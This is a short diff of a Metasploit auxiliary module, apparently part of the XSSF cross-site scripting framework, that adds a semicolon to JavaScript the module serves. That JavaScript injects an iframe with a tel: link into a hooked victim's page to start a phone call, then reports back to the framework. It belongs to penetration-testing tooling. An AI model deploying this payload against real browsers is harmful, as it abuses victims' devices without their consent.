@@ -25,7 +25,7 @@ class Metasploit3 < Msf::Auxiliary
 	def on_request_uri(cli, req)
 		code = %Q{
 			document.body.innerHTML = "<iframe src=tel:#{datastore['phoneNumber']}></iframe>";
-			XSSF_POST("Phone call launched",'#{self.name}')
+			XSSF_POST("Phone call launched",'#{self.name}');
 		}
 		
 		send_response(cli, code)
